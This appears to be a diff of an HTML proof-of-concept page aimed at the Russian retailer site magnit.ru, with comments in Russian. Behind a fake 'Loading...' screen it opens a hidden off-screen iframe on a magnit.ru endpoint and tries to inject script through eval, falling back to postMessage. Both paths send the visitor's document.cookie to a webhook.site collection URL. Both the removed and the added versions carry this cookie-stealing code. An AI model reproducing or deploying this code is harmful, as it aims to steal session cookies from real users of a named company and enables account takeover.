@@ -1,46 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Magnit XSS PoC</title>
 </head>
 <body>
-    <p>Please wait, loading...</p>
+    <h1>Loading...</h1>
+    <p>Please wait while the exploit is loading...</p>
     
-    <iframe id="target" src="https://magnit.ru/profile" style="width:1px;height:1px;border:none;"></iframe>
-    
+    <!-- Основной скрипт -->
     <script>
-        // Обработчик сообщений от iframe
-        window.addEventListener('message', function(event) {
-            if (event.origin === 'https://magnit.ru') {
-                console.log('✅ Получено сообщение от magnit.ru:', event.data);
-                // Отправляем cookies на webhook
-                if (event.data && event.data.cookies) {
-                    fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
-                        method: 'POST',
-                        body: event.data.cookies
-                    });
-                }
-            }
-        });
-        
-        // Внедряем скрипт в iframe
-        document.getElementById('target').onload = function() {
-            console.log('✅ iframe загружен');
+        (function() {
+            console.log('🚀 Запуск PoC для magnit.ru');
             
-            try {
-                var iframeWindow = document.getElementById('target').contentWindow;
+            // Создаем iframe с уязвимым эндпоинтом
+            var iframe = document.createElement('iframe');
+            iframe.src = 'https://magnit.ru/webgate/v2/goods/get';
+            iframe.style.cssText = 'width:1px;height:1px;border:none;position:absolute;left:-9999px;';
+            iframe.id = 'target';
+            document.body.appendChild(iframe);
+            
+            iframe.onload = function() {
+                console.log('✅ iframe загружен');
                 
-                // Отправляем сообщение в iframe
-                iframeWindow.postMessage({
-                    type: 'getCookies',
-                    payload: 'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})'
-                }, 'https://magnit.ru');
-                
-                console.log('✅ postMessage отправлен');
-            } catch(e) {
-                console.log('❌ Ошибка postMessage:', e.message);
-            }
-        };
+                try {
+                    var win = iframe.contentWindow;
+                    
+                    // Пробуем внедрить скрипт через eval
+                    win.eval(`
+                        console.log('🔥 XSS выполняется внутри iframe');
+                        // Отправляем cookies на webhook
+                        fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'text/plain'},
+                            body: document.cookie
+                        });
+                    `);
+                    console.log('✅ Скрипт выполнен через eval');
+                } catch(e) {
+                    console.log('❌ eval не сработал:', e.message);
+                    
+                    // Если eval не работает, отправляем postMessage
+                    try {
+                        iframe.contentWindow.postMessage(
+                            'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})',
+                            'https://magnit.ru'
+                        );
+                        console.log('✅ postMessage отправлен');
+                    } catch(e2) {
+                        console.log('❌ postMessage не сработал:', e2.message);
+                    }
+                }
+            };
+        })();
     </script>
 </body>
 </html>
+
